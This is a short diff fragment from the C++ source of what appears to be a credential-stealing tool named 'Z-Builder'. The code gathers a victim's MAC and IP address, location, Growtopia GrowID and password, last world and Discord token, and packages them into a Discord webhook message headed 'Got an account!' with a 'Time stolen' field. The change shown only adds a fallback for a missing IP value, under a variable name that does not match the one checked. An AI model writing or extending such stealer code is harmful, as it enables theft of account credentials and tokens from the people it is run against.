@@ -147,6 +147,10 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         {
             DToken = "No discord token found";
         }
+        if (IPInfo == "")
+        {
+            IpInfo = "N/A";
+        }
         // Discord Token - End
         string Info = "MAC address(es): ```" + GetMAC() + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
         string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Got an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
